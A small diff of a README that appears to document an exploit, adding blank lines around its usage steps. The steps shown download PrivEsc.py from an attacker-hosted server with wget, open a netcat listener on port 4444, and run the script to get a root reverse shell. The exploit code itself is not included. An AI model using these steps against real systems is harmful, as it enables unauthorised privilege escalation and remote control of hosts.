@@ -36,10 +36,12 @@ python3 exploit.py
     wget http://<Local_IP>:8000/PrivEsc.py
     ```
 - Run netcat listener on Attacker Machine
+
     ```
     nc -nlvp 4444
     ```
 - Run PrivEsc.py and wait for Root shell connection it may take a while.
+
     ```
     python3 PrivEsc.py
     ```
